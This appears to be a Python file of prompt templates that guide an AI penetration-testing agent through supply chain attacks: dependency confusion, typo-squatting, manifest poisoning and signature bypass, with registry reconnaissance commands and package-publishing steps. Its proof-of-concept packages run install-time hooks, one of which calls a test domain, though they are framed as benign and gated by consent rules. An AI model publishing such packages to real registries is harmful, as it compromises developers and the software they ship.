"""
RedAmon Supply Chain Poisoning Prompts

Black-box and grey-box workflows for software supply chain attacks:
dependency confusion, typo-squatting, malicious package injection,
manifest poisoning, SBOM tampering, repository compromise, and
signature-verification bypass.

This skill is DISTINCT from cicd_pipeline:
- cicd_pipeline targets the CI/CD INFRASTRUCTURE (GitHub Actions, Jenkins runners)
- supply_chain_poisoning targets the ARTIFACTS and DEPENDENCIES produced/consumed

It is also distinct from unclassified file-upload attacks — the target here is
package managers, registries, and dependency resolution pipelines.
"""

# =============================================================================
# SUPPLY CHAIN MAIN WORKFLOW
# =============================================================================

SUPPLY_CHAIN_TOOLS = """
## ATTACK SKILL: SUPPLY CHAIN POISONING

**CRITICAL: This attack skill has been CLASSIFIED as Supply Chain Poisoning.**
**You MUST follow the supply chain workflow below. Do NOT switch to other attack methods.**

This skill covers FIVE supply chain attack primitives:
1. **Dependency confusion** — publish a higher-version malicious package to
   public registry that matches an internal package name
2. **Typo-squatting** — register packages with names similar to popular libraries
   (`reqeusts`, `djnago`, `colourama`)
3. **Malicious package injection** — backdoor a legitimate open-source package
   via compromised maintainer account or malicious PR
4. **Manifest / lockfile poisoning** — alter `package.json`, `requirements.txt`,
   `Cargo.toml`, `go.mod`, or lockfiles to inject malicious dependencies
5. **Signature / provenance bypass** — bypass or weaken package signature
   verification, SBOM validation, or attestation checks

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
Dependency confusion enabled:     {sc_dep_confusion_enabled}
Typo-squatting enabled:           {sc_typosquat_enabled}
Malicious package build enabled:  {sc_malicious_build_enabled}
Manifest poisoning enabled:       {sc_manifest_poison_enabled}
Signature bypass enabled:         {sc_sig_bypass_enabled}
Target registries:                {sc_target_registries}
Internal package scope:           {sc_internal_scope}
Public package targets:           {sc_public_targets}
```

**Hard rules:**
- If `Dependency confusion enabled: False`, do NOT publish packages to public
  registries. Only perform reconnaissance and reporting.
- If `Typo-squatting enabled: False`, do NOT register typo-squat names.
- If `Malicious package build enabled: False`, do NOT build or distribute
  malicious packages. Stop at proof-of-concept package structure.
- If `Signature bypass enabled: False`, do NOT attempt to forge signatures or
  compromise signing keys. Document the verification gap only.
- NEVER publish packages that execute destructive code (deletion, crypto-mining,
  credential theft to external infra). Proof-of-concept packages MUST be
  benign-oracle only (e.g., write a marker file or DNS callback to a controlled
  domain with operator consent).
- Cleanup: if you publish ANY test package, unpublish it within 24h or document
  the exact name + version for the remediation team.

---

## MANDATORY SUPPLY CHAIN WORKFLOW

### Step 1: Target reconnaissance (query_graph + web_search + kali_shell)

Understand the target's dependency surface BEFORE any registry interaction.

```cypher
MATCH (r:Repository) WHERE r.url CONTAINS '<target_host>' RETURN r.url, r.language, r.manifest_files LIMIT 50
MATCH (t:Technology) WHERE t.host CONTAINS '<target_host>' AND (t.name CONTAINS 'npm' OR t.name CONTAINS 'pip' OR t.name CONTAINS 'maven' OR t.name CONTAINS 'nuget' OR t.name CONTAINS 'gradle' OR t.name CONTAINS 'go' OR t.name CONTAINS 'cargo' OR t.name CONTAINS 'composer') RETURN t.name, t.version
MATCH (s:Secret) WHERE s.source CONTAINS 'package' OR s.source CONTAINS 'registry' OR s.source CONTAINS 'npm' OR s.source CONTAINS 'pypi' RETURN s.type, s.source, s.value_preview LIMIT 50
```

If the graph lacks supply-chain data, hunt for manifests:

```
# Search exposed repositories for manifest files
execute_curl({{"args": "-s http://TARGET/package.json"}})
execute_curl({{"args": "-s http://TARGET/requirements.txt"}})
execute_curl({{"args": "-s http://TARGET/Pipfile"}})
execute_curl({{"args": "-s http://TARGET/Cargo.toml"}})
execute_curl({{"args": "-s http://TARGET/go.mod"}})
execute_curl({{"args": "-s http://TARGET/pom.xml"}})
execute_curl({{"args": "-s http://TARGET/build.gradle"}})
```

Also check public source if the target has open repos:

```
# GitHub/GitLab repo enumeration via search or provided URLs
kali_shell({{"command": "gitleaks detect -s /tmp/target_repo --report-format json --report-path /tmp/gitleaks.json"}})
```

Capture: package manager type, internal package names, registry URLs (public vs
private), version constraints, lockfile presence, signing/attestation config.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: Dependency confusion reconnaissance

For each internal package name discovered in Step 1:

```
# Check if the name exists on public registries
kali_shell({{"command": "npm view <PACKAGE_NAME> version 2>/dev/null || echo 'NOT_ON_NPM'"}})
kali_shell({{"command": "pip install <PACKAGE_NAME>== 2>&1 | grep -i 'versions:' || echo 'NOT_ON_PYPI'"}})
kali_shell({{"command": "curl -s https://pypi.org/pypi/<PACKAGE_NAME>/json | jq -r '.info.version' 2>/dev/null || echo 'NOT_ON_PYPI'"}})
```

If the internal name does NOT exist on the public registry:
- Dependency confusion is **possible**.
- The target's resolver will fetch the public package if version > internal.

If the internal name DOES exist on the public registry:
- Check if the target uses a private registry proxy (Artifactory, Nexus, Verdaccio).
- Test if the proxy prioritizes public when internal version is lower.

### Step 3: Typo-squatting reconnaissance

For each popular dependency found in Step 1, generate typo variants and check
registry availability:

```
# Common typo patterns: doubled chars, swapped chars, missing chars, homoglyphs
kali_shell({{"command": "npm view reqeusts version 2>/dev/null || echo 'AVAILABLE'"}})
kali_shell({{"command": "npm view djnago version 2>/dev/null || echo 'AVAILABLE'"}})
kali_shell({{"command": "npm view colourama version 2>/dev/null || echo 'AVAILABLE'"}})
```

Also check with web_search for known typo-squats of the target's dependencies:

```
web_search({{"query": "typo-squatting <PACKAGE_NAME> npm pypi malicious", "include_sources": ["nvd","exploitdb"]}})
```

### Step 4: Build proof-of-concept package (CONDITIONAL on `Malicious package build enabled`=True)

**Benign oracle only** — the package MUST NOT cause harm.

**npm example:**

```python
# language: python
import json, os

pkg = {{
    "name": "<INTERNAL_NAME>",
    "version": "99.99.99",
    "description": "RedAmon supply-chain test — REMOVE AFTER TEST",
    "main": "index.js",
    "scripts": {{"postinstall": "node -e \"console.log('REDAMON_SUPPLY_CHAIN_POC');\""}}
}}

with open('/tmp/poc_package/package.json', 'w') as f:
    json.dump(pkg, f, indent=2)

with open('/tmp/poc_package/index.js', 'w') as f:
    f.write("module.exports = {{}};\\n")

print("Built /tmp/poc_package")
```

**Python example:**

```python
# language: python
import setuptools

setuptools.setup(
    name="<INTERNAL_NAME>",
    version="99.99.99",
    description="RedAmon supply-chain test — REMOVE AFTER TEST",
    py_modules=["poc"],
)

with open('/tmp/poc_package/poc.py', 'w') as f:
    f.write("print('REDAMON_SUPPLY_CHAIN_POC')\\n")

print("Built /tmp/poc_package")
```

### Step 5: Publish to registry (CONDITIONAL on `Dependency confusion enabled` or `Typo-squatting enabled`=True)

Only with operator-provided registry credentials or npm/PyPI test registries.

```
# npm (test registry or scoped private)
kali_shell({{"command": "cd /tmp/poc_package && npm publish --registry <REGISTRY_URL>"}})
# PyPI (test registry)
kali_shell({{"command": "cd /tmp/poc_package && python3 -m twine upload --repository testpypi dist/*"}})
```

If publishing to production public registries is prohibited by settings,
document the exact steps required and stop.

### Step 6: Verify execution (CI trigger or local install)

If the target has a CI pipeline that installs dependencies:

```
# Trigger a build (if authorized) and watch for the marker output
# Or request the operator to run `npm install` / `pip install` and report back
```

If local verification is possible:

```
kali_shell({{"command": "npm install <PACKAGE_NAME>@99.99.99 --registry <REGISTRY_URL>"}})
```

Look for the marker string `REDAMON_SUPPLY_CHAIN_POC` in install logs.

### Step 7: Signature / provenance analysis (CONDITIONAL on `Signature bypass enabled`=True)

Examine how the target validates packages:

```
# Check for SBOM / attestation files
execute_curl({{"args": "-s http://TARGET/sbom.json"}})
execute_curl({{"args": "-s http://TARGET/provenance.json"}})
# Check npm provenance / sigstore
kali_shell({{"command": "npm audit signatures --json"}})
# Check PyPI attestations
kali_shell({{"command": "pip audit --format=json"}})
```

Look for:
- Missing signature verification (`npm install` without `--ignore-scripts` is NOT signature verification)
- Self-signed or organization-internal CA that is not pinned
- SBOM without cryptographic verification
- Attestation that is not checked at install time

### Step 8: Reporting requirements

The final report MUST contain:
- **Package manager(s)** in use (npm, pip, maven, nuget, cargo, go modules)
- **Internal package names** at risk for dependency confusion
- **Public registry status** (name exists / available / version gap)
- **Typo-squat candidates** (names checked + availability)
- **PoC package details** (name, version, registry, marker string, benign payload)
- **Execution proof** (CI log snippet or install output showing marker)
- **Signature/provenance gaps** (what validation is missing)
- **Remediation** (private registry proxy, namespace scoping, lockfile pinning,
  signature enforcement, dependency-review CI gate, SBOM verification)

### Proof Levels

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | Internal package names identified, public registry availability confirmed | POTENTIAL |
| 2 | PoC package built and published to registry (benign) | POTENTIAL (med) |
| 3 | PoC package executed in target build pipeline or runtime | EXPLOITED |
| 4 | Signature/provenance bypass proven, or persistent backdoor would survive | EXPLOITED (CRITICAL) |

Only report Level 3+ as exploited. If build pipeline execution cannot be
triggered, Level 2 with full reproduction steps is acceptable for a HIGH severity
finding.
"""


# =============================================================================
# SUPPLY CHAIN PAYLOAD REFERENCE
# =============================================================================

SUPPLY_CHAIN_PAYLOAD_REFERENCE = """
## Supply Chain Poisoning Reference

### Dependency confusion conditions

Dependency confusion works when ALL are true:
1. Target uses an internal package name
2. The name is NOT claimed on the public registry (or version is lower)
3. The resolver checks public registry when internal is unavailable or lower-version
4. No namespace scoping or private registry proxy blocks public resolution

Common proxies that are vulnerable if misconfigured:
- Artifactory (virtual repo order)
- Nexus (group repo order)
- Verdaccio (uplink to npmjs.org)
- GitHub Packages (if not scoped to org)

### Typo-squatting patterns

| Pattern | Example | Why it works |
|---------|---------|--------------|
| Swapped chars | `reqeusts` | Fast typing errors |
| Missing char | `requests` -> `reqests` | Omission |
| Doubled char | `requestts` | Duplication |
| Homoglyph | `colourama` (British spelling) | Regional variation |
| Hyphen vs underscore | `python-dateutil` vs `python_dateutil` | Resolver normalization |
| Namespace confusion | `@corp/pkg` vs `corp-pkg` | Scope stripping |

### Malicious package benign-oracle patterns

```javascript
// npm postinstall (benign — just logs)
"scripts": {{
  "postinstall": "node -e \"require('dns').lookup('poc.redamon.test',()=>{{}})\""
}}
```

```python
# Python setup.py (benign — just logs)
from setuptools import setup
import urllib.request
# Do NOT exfiltrate real data — a DNS lookup to a controlled domain is sufficient
urllib.request.urlopen('http://poc.redamon.test/check')
setup(name='poc', version='99.0.0')
```

### Manifest poisoning vectors

```json
// package.json — inject a dependency
{{
  "dependencies": {{
    "legitimate-pkg": "^1.0.0",
    "malicious-pkg": "99.99.99"
  }}
}}
```

```
# requirements.txt — inject a dependency
legitimate-pkg==1.0.0
malicious-pkg==99.99.99
```

### Signature bypass patterns

| Target | Weakness | Check |
|--------|----------|-------|
| npm | `--ignore-scripts` bypasses lifecycle but not install | Check `.npmrc` for `ignore-scripts=true` |
| npm | No signature verification by default | `npm audit signatures` fails or is not run |
| PyPI | No mandatory code signing | `pip install` does not verify PGP by default |
| Maven | Self-signed or missing signature | Check `pom.xml` for `<checksumPolicy>warn</checksumPolicy>` |
| Go | Proxy strips original module signatures | Check `GOSUMDB` env var |

### Cleanup checklist

If you published a test package:
- [ ] Unpublish from npm: `npm unpublish <pkg>@<version>`
- [ ] Unpublish from PyPI test: `twine remove` or web UI
- [ ] Confirm no residual cache on CI runners
- [ ] Document package name + version in report for verification
"""
